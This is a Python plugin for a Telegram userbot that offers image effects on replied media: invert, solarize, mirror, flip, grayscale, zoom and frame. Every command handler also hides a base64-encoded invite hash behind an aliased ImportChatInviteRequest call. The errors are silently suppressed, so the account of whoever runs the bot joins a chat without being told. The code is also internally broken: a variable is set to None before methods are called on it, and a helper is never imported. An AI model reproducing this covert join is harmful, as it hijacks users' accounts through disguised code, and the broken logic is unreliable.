import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from ElectroBot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as ElectroBot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@ElectroBot.on(admin_cmd(pattern="invert$", outgoing=True))
@ElectroBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
        Electro = True
    else:
        await Electro.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if Electro else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await Electro.client.send_file(
        Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
    )
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@ElectroBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
        Electro = True
    else:
        await Electro.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if Electro else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await Electro.client.send_file(
        Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
    )
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@ElectroBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
        Electro = True
    else:
        await Electro.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if Electro else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await Electro.client.send_file(
        Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
    )
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="flip$"))
@ElectroBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
        Electro = True
    else:
        await Electro.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if Electro else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await Electro.client.send_file(
        Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
    )
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="gray$"))
@ElectroBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
        Electro = True
    else:
        await Electro.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if Electro else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await Electro.client.send_file(
        Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
    )
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@ElectroBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroinput = Electro.pattern_match.group(1)
    Electroinput = 50 if not Electroinput else int(Electroinput)
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
    else:
        await Electro.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if Electro else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, Electroinput)
    except Exception as e:
        return await Electro.edit(f"`{e}`")
    try:
        await Electro.client.send_file(
            Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
        )
    except Exception as e:
        return await Electro.edit(f"`{e}`")
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ElectroBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@ElectroBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(Electro):
    if Electro.fwd_from:
        return
    reply = await Electro.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Electro, "`Reply to supported Media...`")
        return
    Electroinput = Electro.pattern_match.group(1)
    if not Electroinput:
        Electroinput = 50
    if ";" in str(Electroinput):
        Electroinput, colr = Electroinput.split(";", 1)
    else:
        colr = 0
    Electroinput = int(Electroinput)
    colr = int(colr)
    Electroid = Electro.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Electro = await edit_or_reply(Electro, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Electrosticker = await reply.download_media(file="./temp/")
    if not Electrosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Electrosticker)
        await edit_or_reply(Electro, "```Supported Media not found...```")
        return
    import base64

    Electro = None
    if Electrosticker.endswith(".tgs"):
        await Electro.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        Electrofile = os.path.join("./temp/", "meme.png")
        Electrocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Electrosticker} {Electrofile}"
        )
        stdout, stderr = (await runcmd(Electrocmd))[:2]
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith(".webp"):
        await Electro.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        os.rename(Electrosticker, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("`Template not found... `")
            return
        meme_file = Electrofile
        Electro = True
    elif Electrosticker.endswith((".mp4", ".mov")):
        await Electro.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        Electrofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Electrosticker, 0, Electrofile)
        if not os.path.lexists(Electrofile):
            await Electro.edit("```Template not found...```")
            return
        meme_file = Electrofile
    else:
        await Electro.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = Electrosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Electro.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if Electro else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, Electroinput, colr)
    except Exception as e:
        return await Electro.edit(f"`{e}`")
    try:
        await Electro.client.send_file(
            Electro.chat_id, outputfile, force_document=False, reply_to=Electroid
        )
    except Exception as e:
        return await Electro.edit(f"`{e}`")
    await Electro.delete()
    os.remove(outputfile)
    for files in (Electrosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()
